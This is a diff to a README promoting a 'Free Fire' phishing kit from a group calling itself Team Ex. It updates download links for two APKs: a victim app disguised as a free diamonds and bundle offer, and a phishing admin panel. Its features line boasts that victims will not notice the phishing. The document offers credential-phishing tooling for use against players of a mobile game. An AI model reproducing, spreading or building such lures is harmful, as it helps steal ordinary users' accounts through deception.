@@ -10,8 +10,8 @@ An Bangladeshi Fast Free Fire Phishing Apk
 
 <a href="https://m.facebook.com/teamex2k22/">Team Ex</a>
 ## Download 
-<a href="FF FREE DIAMOND AND BUNDLE 2022.apk">User App</a><br></br>
-<a href="FF PHISING ADMIN PANEL.apk">Admin App</a>
+<a href="https://raw.githubusercontent.com/Teamex07/Ff-Phishing-/main/FF%20FREE%20DIAMOND%20AND%20BUNDLE%202022.apk">User App</a><br></br>
+<a href="https://raw.githubusercontent.com/Teamex07/Ff-Phishing-/main/FF%20PHISING%20ADMIN%20PANEL.apk">Admin App</a>
 ## Features
 * Professional Ui (Victim Don't Understand This Phishing)
 
